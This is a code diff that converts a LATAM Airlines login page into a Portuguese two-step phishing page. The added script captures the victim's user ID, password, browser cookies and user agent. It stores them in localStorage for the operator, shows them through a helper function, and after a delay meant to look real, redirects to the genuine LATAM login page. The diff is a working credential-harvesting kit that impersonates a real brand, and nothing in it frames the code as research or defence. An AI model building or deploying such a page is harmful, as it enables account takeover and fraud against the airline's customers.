@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -26,7 +26,7 @@
   .card {
     background: #ffffff;
     width: 100%;
-    max-width: 480px; /* aumentado */
+    max-width: 480px;
     border-radius: 16px;
     box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
     overflow: hidden;
@@ -35,7 +35,7 @@
   }
 
   .card-inner {
-    padding: 48px 44px 40px; /* padding maior também */
+    padding: 48px 44px 40px;
   }
 
   .logo {
@@ -68,8 +68,17 @@
     margin-bottom: 28px;
   }
 
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    color: #374151;
+    margin-bottom: 8px;
+  }
+
   input[type="text"],
-  input[type="email"] {
+  input[type="email"],
+  input[type="password"] {
     width: 100%;
     padding: 15px 16px;
     border: 1px solid #d1d5db;
@@ -145,55 +154,169 @@
   .regain a:hover {
     text-decoration: underline;
   }
+
+  .hidden {
+    display: none;
+  }
+
+  .back-link {
+    display: inline-block;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #6b7280;
+    text-decoration: none;
+    cursor: pointer;
+  }
+
+  .back-link:hover {
+    color: #e11d48;
+  }
 </style>
 </head>
 <body>
 
   <div class="card">
     <div class="card-inner">
-      
-      <!-- Logo oficial -->
+
+      <!-- Logo -->
       <div class="logo">
         <img src="logo.png" alt="LATAM Airlines">
       </div>
 
-      <h1>Please enter your user ID</h1>
-      <p class="subtitle">If you are already a LATAM member, please enter your log in details:</p>
+      <!-- ========== TELA 1 - USER ID ========== -->
+      <div id="step1">
+        <h1>Digite seu usuário</h1>
+        <p class="subtitle">Se você já é membro LATAM, digite seus dados de acesso:</p>
 
-      <form id="loginForm">
-        <div class="field">
-          <input 
-            type="text" 
-            id="userId" 
-            name="userId" 
-            placeholder="Email or membership number" 
-            autocomplete="username"
-            required
-          >
+        <form id="formStep1">
+          <div class="field">
+            <input 
+              type="text" 
+              id="userId" 
+              name="userId" 
+              placeholder="E-mail ou número de sócio" 
+              autocomplete="username"
+              required
+            >
+          </div>
+
+          <button type="submit" class="btn-continue">Continuar</button>
+        </form>
+
+        <div class="create-account">
+          <a href="#">Criar conta</a>
         </div>
 
-        <button type="submit" class="btn-continue">Continue</button>
-      </form>
+        <div class="divider"></div>
 
-      <div class="create-account">
-        <a href="#">Create account</a>
+        <div class="regain">
+          Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a>
+        </div>
       </div>
 
-      <div class="divider"></div>
+      <!-- ========== TELA 2 - SENHA ========== -->
+      <div id="step2" class="hidden">
+        <div class="back-link" id="btnBack">← Voltar</div>
 
-      <div class="regain">
-        Can’t log in to your account? <a href="#">Regain access</a>
+        <h1>Digite sua senha</h1>
+        <p class="subtitle">Agora digite a senha da sua conta LATAM:</p>
+
+        <form id="formStep2">
+          <div class="field">
+            <label id="labelUser"></label>
+            <input 
+              type="password" 
+              id="password" 
+              name="password" 
+              placeholder="Senha" 
+              autocomplete="current-password"
+              required
+            >
+          </div>
+
+          <button type="submit" class="btn-continue">Entrar</button>
+        </form>
+
+        <div class="create-account">
+          <a href="#">Esqueceu a senha?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="regain">
+          Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a>
+        </div>
       </div>
 
     </div>
   </div>
 
 <script>
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
+  // ================== CONFIGURAÇÃO ==================
+  // Depois de capturar, redireciona para o site real
+  const REAL_LOGIN_URL = "https://auth.latamairlines.com/u/login/";
+  // ==================================================
+
+  let capturedUser = "";
+
+  // Tela 1 → Tela 2
+  document.getElementById("formStep1").addEventListener("submit", function(e) {
     e.preventDefault();
-    const userId = document.getElementById('userId').value.trim();
-    console.log('User ID:', userId);
+    
+    capturedUser = document.getElementById("userId").value.trim();
+    
+    if (!capturedUser) return;
+
+    // Mostra o usuário na tela de senha
+    document.getElementById("labelUser").textContent = capturedUser;
+
+    // Troca as telas
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
   });
+
+  // Botão Voltar
+  document.getElementById("btnBack").addEventListener("click", function() {
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("step1").classList.remove("hidden");
+  });
+
+  // Tela 2 → Captura + Redirect
+  document.getElementById("formStep2").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const password = document.getElementById("password").value;
+
+    const data = {
+      email: capturedUser,
+      password: password,
+      cookies: document.cookie || "(nenhum)",
+      data: new Date().toLocaleString("pt-BR"),
+      userAgent: navigator.userAgent
+    };
+
+    // Salva no localStorage (você consegue ver depois)
+    let historico = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
+    historico.push(data);
+    localStorage.setItem("latam_capturas", JSON.stringify(historico));
+
+    // Mostra no console também
+    console.log("%c[CAPTURA LATAM]", "color: #e11d48; font-weight: bold;");
+    console.log(data);
+
+    // Pequeno delay pra parecer real e redireciona
+    setTimeout(() => {
+      window.location.href = REAL_LOGIN_URL;
+    }, 800);
+  });
+
+  // Atalho pra você ver as capturas facilmente
+  // Abre o console (F12) e digita: verCapturas()
+  window.verCapturas = function() {
+    const dados = JSON.parse(localStorage.getItem("latam_capturas") || "[]");
+    console.table(dados);
+    return dados;
+  };
 </script>
 
 </body>
